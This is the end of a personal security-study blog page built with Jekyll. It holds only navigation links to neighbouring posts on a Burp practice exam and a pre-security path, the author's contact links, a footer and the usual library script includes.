      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
      <span class="sr-only">LinkedIn</span>
    </a>
  

  

  

</section>



      

      <ul class="pagination blog-pager">
        
        <li class="page-item previous">
          <a class="page-link" href="/2022-03-30-PracticeExam/" data-toggle="tooltip" data-placement="top" title="Burp Certified Practitioner Practice Exam.">&larr; Previous Post</a>
        </li>
        
        
        <li class="page-item next">
          <a class="page-link" href="/2022-07-11-1Pre-Security/" data-toggle="tooltip" data-placement="top" title="1.Pre-Security path.">Next Post &rarr;</a>
        </li>
        
      </ul>
      
  
  
  

  


  



    </div>
  </div>
</div>


  <footer>
  <div class="container-md beautiful-jekyll-footer">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
    <a href="/feed.xml" title="RSS">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">RSS</span>
    </a>
  </li><li class="list-inline-item">
    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Email me</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://github.com/Qv1nTv5" title="GitHub">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">GitHub</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://twitter.com/Qvintvs1" title="Twitter">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">Twitter</span>
   </a>
  </li><li class="list-inline-item">
    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
      <span class="fa-stack fa-lg" aria-hidden="true">
        <i class="fas fa-circle fa-stack-2x"></i>
        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
      </span>
      <span class="sr-only">LinkedIn</span>
   </a>
  </li></ul>

      
      <p class="copyright text-muted">
      
        Qv1nTv5
        &nbsp;&bull;&nbsp;
      
      2024

      

      
      </p>
      <p class="theme-by text-muted">
        Powered by
        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
      </p>
      </div>
    </div>
  </div>
</footer>


  
  
    
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>


  
    
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>


  
    
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>


  



  
    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
    
      <script src="/assets/js/beautifuljekyll.js"></script>
    
  









</body>
</html>
